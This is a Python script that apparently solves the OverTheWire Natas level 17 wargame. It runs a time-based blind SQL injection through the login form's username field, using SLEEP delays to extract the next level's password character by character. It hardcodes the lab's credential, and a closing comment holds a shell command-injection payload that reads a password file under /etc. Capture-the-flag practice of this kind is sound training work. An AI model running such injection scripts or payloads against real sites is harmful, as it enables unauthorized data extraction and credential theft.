from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import string
from time import *

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
passwd = list()

username = 'natas17'
password = 'XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd'
leakedPassword = ''       

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
while len(passwd) < 32:
    
    for char in characters:
        start = time()
        print('Trying with the password :' + "".join(passwd) + char)
        reponse = session.post(url , data={"username":'natas18" AND BINARY password LIKE"'+ "".join(passwd)+char+'%" AND SLEEP(2) #'}, auth=(username, password))
        content = reponse.text
        duration = time()-start
        if duration > 1:
            passwd.append(char)
            leakedPassword += char
            break
print('The password is :', leakedPassword)        
    



#$(grep b /etc/natas_webpass/natas17)